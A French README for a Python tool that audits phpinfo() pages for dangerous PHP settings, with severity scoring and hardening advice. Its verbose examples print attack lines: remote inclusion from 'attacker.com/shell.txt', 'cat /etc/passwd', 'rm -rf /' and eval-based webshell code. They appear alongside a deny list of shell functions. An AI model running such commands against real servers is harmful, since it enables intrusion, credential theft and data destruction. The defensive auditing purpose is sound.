# PHPInfo Security Analyzer

Un outil d'analyse de sécurité avancé pour identifier les vulnérabilités et configurations dangereuses dans les pages `phpinfo()`.

## 🎯 Fonctionnalités

### Détection automatique de vulnérabilités

- ✅ **Analyse de version PHP** - Détecte les versions EOL (End-of-Life) et obsolètes
- ✅ **Vérification de 15+ directives critiques** - display_errors, allow_url_include, disable_functions, etc.
- ✅ **Détection de fonctions dangereuses** - exec, system, eval, shell_exec, etc.
- ✅ **Analyse des extensions risquées** - xdebug en production, ionCube, etc.
- ✅ **Divulgation d'informations** - Chemins système, configuration exposée
- ✅ **Génération de vecteurs d'attaque** - RFI, RCE, Session Hijacking, SSRF, etc.

### Système de scoring

Les vulnérabilités sont classées par sévérité :
- 🚨 **CRITICAL** - Risque d'exploitation immédiate (RCE, RFI)
- 🔴 **HIGH** - Vulnérabilités sérieuses (Command Injection, XSS)
- 🟠 **MEDIUM** - Risques modérés (Information Disclosure)
- 🟡 **LOW** - Problèmes mineurs (Configuration suboptimale)

### Modes d'analyse

- **Mode normal** : Résumé concis avec identification des problèmes
- **Mode verbeux** (`-v`) : Explications détaillées pour chaque vulnérabilité :
  - 💡 Pourquoi c'est important
  - 🎯 Exemples d'exploitation concrets
  - 🛡️ Comment se protéger
  - 📝 Notes contextuelles

## 📦 Installation

### Prérequis

- Python 3.7+
- pip

### Installation des dépendances

```bash
pip install requests beautifulsoup4 simple-chalk
```

Ou avec un fichier requirements.txt :

```bash
pip install -r requirements.txt
```

**requirements.txt** :
```
requests>=2.28.0
beautifulsoup4>=4.11.0
simple-chalk>=0.1.0
```

## 🚀 Utilisation

### Syntaxe de base

```bash
python phpinfo_analyzer.py [OPTIONS]
```

### Options

| Option | Raccourci | Description | Obligatoire |
|--------|-----------|-------------|-------------|
| `--url URL` | `-u` | URL de la page phpinfo() | Oui* |
| `--input FILE` | `-i` | Fichier HTML local contenant phpinfo() | Oui* |
| `--output FILE` | `-o` | Fichier de sortie JSON (défaut: phpinfo_report.json) | Non |
| `--verbose` | `-v` | Mode verbeux avec explications détaillées | Non |

*\* --url ou --input est obligatoire (mutuellement exclusif)*

### Exemples d'utilisation

#### 1. Analyser une URL distante

```bash
python phpinfo_analyzer.py --url http://target.com/phpinfo.php --output rapport.json
```

#### 2. Analyser un fichier HTML local

```bash
python phpinfo_analyzer.py --input phpinfo.html --output rapport.json
```

#### 3. Mode verbeux pour explications détaillées

```bash
python phpinfo_analyzer.py -u http://site.com/info.php -o audit.json -v
```

#### 4. Workflow complet avec sauvegarde

```bash
# Sauvegarder le phpinfo()
curl http://target.com/phpinfo.php > phpinfo.html

# Analyser le fichier sauvegardé
python phpinfo_analyzer.py -i phpinfo.html -o rapport.json -v
```

#### 5. Syntaxe courte

```bash
python phpinfo_analyzer.py -u http://example.com/info.php -o scan.json -v
```

## 📊 Format du rapport

Le rapport JSON généré contient :

```json
{
  "scan_date": "2024-01-15T10:30:00",
  "summary": {
    "total_vulnerabilities": 12,
    "critical": 2,
    "high": 4,
    "medium": 5,
    "low": 1,
    "positive_points": 8
  },
  "vulnerabilities": [
    {
      "severity": "CRITICAL",
      "category": "Configuration PHP",
      "issue": "allow_url_include activé",
      "risk": "Remote File Inclusion (RFI) - Exécution de code arbitraire",
      "current_value": "On",
      "recommended_value": "Off",
      "detail": "Explication détaillée...",
      "prevention": "Comment corriger..."
    }
  ],
  "information_disclosure": [...],
  "positive_points": [...],
  "attack_vectors": [...]
}
```

## 🔍 Vecteurs d'attaque identifiés

L'outil détecte et documente les vecteurs d'attaque suivants :

### 1. Remote File Inclusion (RFI)
- **Condition** : allow_url_include=On
- **Exploitation** : `include($_GET['page'])` avec URL distante
- **Impact** : Remote Code Execution (RCE) complet

### 2. OS Command Injection
- **Condition** : Fonctions dangereuses non désactivées (exec, system, shell_exec)
- **Exploitation** : `system($_GET['cmd'])`
- **Impact** : Compromission totale du serveur

### 3. Session Hijacking
- **Condition** : session.cookie_httponly=Off ou session.cookie_secure=Off
- **Exploitation** : Vol de cookies via XSS ou interception HTTP
- **Impact** : Usurpation d'identité utilisateur

### 4. Information Disclosure
- **Condition** : Page phpinfo() accessible publiquement
- **Exploitation** : Reconnaissance de la configuration système
- **Impact** : Facilite les attaques ciblées

### 5. Server-Side Request Forgery (SSRF)
- **Condition** : allow_url_fopen=On
- **Exploitation** : `file_get_contents($_GET['url'])`
- **Impact** : Scan du réseau interne, bypass de firewall

## 🛡️ Directives PHP analysées

### Critiques (CRITICAL)

| Directive | Valeur sûre | Risque |
|-----------|-------------|--------|
| `allow_url_include` | Off | RFI → RCE complet |
| `register_globals` | Off | Variable injection |

### Élevées (HIGH)

| Directive | Valeur sûre | Risque |
|-----------|-------------|--------|
| `display_errors` | Off | Exposition chemins/données |
| `allow_url_fopen` | Off | SSRF, RFI |
| `enable_dl` | Off | Chargement extensions malveillantes |
| `disable_functions` | Configuré | Exécution commandes système |
| `session.cookie_httponly` | On | Vol de session via XSS |
| `session.cookie_secure` | On | Interception cookies HTTP |

### Moyennes (MEDIUM)

| Directive | Valeur sûre | Risque |
|-----------|-------------|--------|
| `display_startup_errors` | Off | Exposition erreurs démarrage |
| `log_errors` | On | Absence de logs forensiques |
| `open_basedir` | Configuré | Accès non restreint filesystem |
| `session.use_strict_mode` | On | Session fixation |
| `file_uploads` | Off* | Upload fichiers malveillants |

*\* Acceptable si bien implémenté avec validation stricte*

### Faibles (LOW)

| Directive | Valeur sûre | Risque |
|-----------|-------------|--------|
| `expose_php` | Off | Divulgation version PHP |
| `max_execution_time` | 30-60s | Déni de service |
| `memory_limit` | 128-256M | Épuisement mémoire |

## 🎓 Mode verbeux - Exemples de sorties

### Exemple 1 : allow_url_include activé

```
🚨 allow_url_include activé
   Valeur actuelle: On
   Valeur recommandée: Off

   💡 Pourquoi c'est important:
   La vulnérabilité la plus dangereuse ! Avec allow_url_include=On, un attaquant 
   peut inclure et exécuter du code PHP depuis un serveur distant : 
   include($_GET["page"]) devient include("http://attacker.com/shell.txt"). 
   Le fichier distant est téléchargé et exécuté côté serveur avec les permissions PHP. 
   Cela donne un contrôle TOTAL du serveur : lecture/écriture de fichiers, 
   exécution de commandes, accès aux bases de données, pivot vers d'autres systèmes.

   🛡️  Comment se protéger:
   TOUJOURS désactiver allow_url_include. Cette directive n'a AUCUNE utilisation 
   légitime en production. C'est la porte d'entrée n°1 pour les Remote Code Execution.
```

### Exemple 2 : Fonctions dangereuses actives

```
⚠️  Fonctions dangereuses actives détectées
   Nombre: 15

   💡 Pourquoi c'est dangereux:
   Ces fonctions permettent l'exécution de commandes système ou d'actions critiques:

   🎯 exec/system/shell_exec:
      Permet d'exécuter n'importe quelle commande système
      Exemple: system('cat /etc/passwd'); ou exec('rm -rf /')
      Si injection possible: RCE immédiat

   🎯 eval/assert:
      Exécute du code PHP arbitraire depuis une string
      Exemple: eval($_GET['code']); = webshell instantané
      Aucune utilisation légitime en production

   🛡️  Solution:
   Ajouter dans php.ini:
   disable_functions=exec,shell_exec,system,passthru,proc_open,
                     popen,eval,assert,pcntl_exec,show_source
```

## 📈 Interprétation des résultats

### Scénario 1 : Serveur en production exposé

```
📊 RÉSUMÉ:
  • Total vulnérabilités: 18
  • Critiques: 3
  • Élevées: 7
  • Moyennes: 6
  • Faibles: 2
  • Points positifs: 2

🚨 VULNÉRABILITÉS CRITIQUES:
  ⚠ PHP 5.6.40 n'est plus maintenu (EOL: 2018-12-31)
  ⚠ allow_url_include activé
  ⚠ Extension xdebug détectée en production
```

**Actions recommandées** :
1. 🚨 **URGENT** : Supprimer la page phpinfo() de production
2. 🚨 **URGENT** : Désactiver allow_url_include immédiatement
3. 🚨 **URGENT** : Désinstaller xdebug de production
4. 📅 **Planifier** : Migration vers PHP 8.1+
5. 🔧 **Configurer** : disable_functions avec liste complète
6. 🔧 **Activer** : session.cookie_httponly et session.cookie_secure

### Scénario 2 : Configuration sécurisée

```
📊 RÉSUMÉ:
  • Total vulnérabilités: 2
  • Critiques: 0
  • Élevées: 0
  • Moyennes: 1
  • Faibles: 1
  • Points positifs: 18

✅ POINTS POSITIFS:
  • Version PHP 8.2.15 - Récente et maintenue
  • display_errors correctement configuré
  • allow_url_include correctement configuré
  • disable_functions correctement configuré
  • session.cookie_httponly correctement configuré
  • session.cookie_secure correctement configuré
```

**Actions recommandées** :
1. ✅ Configuration globalement sécurisée
2. 🔧 Corriger les 2 points mineurs identifiés
3. 🗑️ Supprimer la page phpinfo() (même si protégée)

## ⚠️ Avertissements de sécurité

### Sur l'utilisation de phpinfo()

> **⚠️ ATTENTION** : La présence d'une page `phpinfo()` accessible publiquement est elle-même une vulnérabilité critique. Cette page expose l'intégralité de la configuration serveur et facilite grandement les attaques ciblées.

**Recommandations** :
- 🗑️ **Supprimer** toute page phpinfo() de production
- 🔒 Si absolument nécessaire (dev/staging) : protéger par authentification forte + IP whitelist
- 📝 Utiliser des alternatives comme des scripts de vérification spécifiques
- 🔍 Auditer régulièrement pour détecter des phpinfo() oubliés

### Sur l'analyse de serveurs tiers

> **⚠️ LÉGALITÉ** : N'utilisez cet outil QUE sur des serveurs dont vous êtes propriétaire ou pour lesquels vous avez une autorisation écrite explicite. L'analyse non autorisée de serveurs peut être illégale dans votre juridiction.

## 🔧 Correction des vulnérabilités

### Configuration php.ini recommandée

```ini
; Version
; Utiliser PHP 8.1+ minimum

; Affichage des erreurs
display_errors = Off
display_startup_errors = Off
log_errors = On
error_log = /var/log/php/error.log

; Inclusion de fichiers
allow_url_fopen = Off
allow_url_include = Off

; Fonctions dangereuses
disable_functions = exec,shell_exec,system,passthru,proc_open,popen,pcntl_exec,eval,assert,create_function,show_source,symlink,curl_exec,curl_multi_exec,parse_ini_file,dl,chown,chmod

; Restrictions filesystem
open_basedir = /var/www/monapp:/tmp

; Uploads
file_uploads = On  ; Si nécessaire
upload_max_filesize = 10M
post_max_size = 10M

; Sessions
session.cookie_httponly = On
session.cookie_secure = On
session.use_strict_mode = On
session.cookie_samesite = Strict

; Ressources
max_execution_time = 30
memory_limit = 128M

; Divers
expose_php = Off
enable_dl = Off
```

### Vérification de la configuration

Après modification du php.ini :

```bash
# Redémarrer PHP-FPM
sudo systemctl restart php8.2-fpm

# Ou Apache
sudo systemctl restart apache2

# Vérifier les changements
php -i | grep "display_errors"
php -i | grep "allow_url_include"
php -i | grep "disable_functions"
```

## 🤝 Contribution

Les contributions sont les bienvenues ! N'hésitez pas à :
- Signaler des bugs
- Proposer de nouvelles fonctionnalités
- Ajouter des vérifications de sécurité
- Améliorer la documentation

## 📝 Changelog

### Version 2.0.0 (2024)
- ✨ Ajout du mode verbeux avec explications détaillées
- ✨ Support des fichiers HTML locaux (--input)
- ✨ Renommage --file en --output
- 🔍 Détection de 15+ directives critiques
- 📊 Génération de vecteurs d'attaque
- 🎨 Interface colorée améliorée

### Version 1.0.0 (Initial)
- 🎉 Version initiale
- 🔍 Analyse basique de phpinfo()
- 📄 Export JSON

## 📄 Licence

MIT License - Voir le fichier LICENSE pour plus de détails

## 👨‍💻 Auteur

Outil développé pour faciliter les audits de sécurité PHP.

## 🔗 Ressources utiles

- [PHP Security Guide](https://www.php.net/manual/fr/security.php)
- [OWASP PHP Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/PHP_Configuration_Cheat_Sheet.html)
- [PHP Supported Versions](https://www.php.net/supported-versions.php)
- [CVE Details - PHP](https://www.cvedetails.com/product/128/PHP-PHP.html)

## ⭐ Support

Si cet outil vous a été utile, n'hésitez pas à lui donner une étoile !

---

**Disclaimer** : Cet outil est fourni à des fins éducatives et d'audit de sécurité uniquement. L'auteur n'est pas responsable de l'utilisation abusive de cet outil.
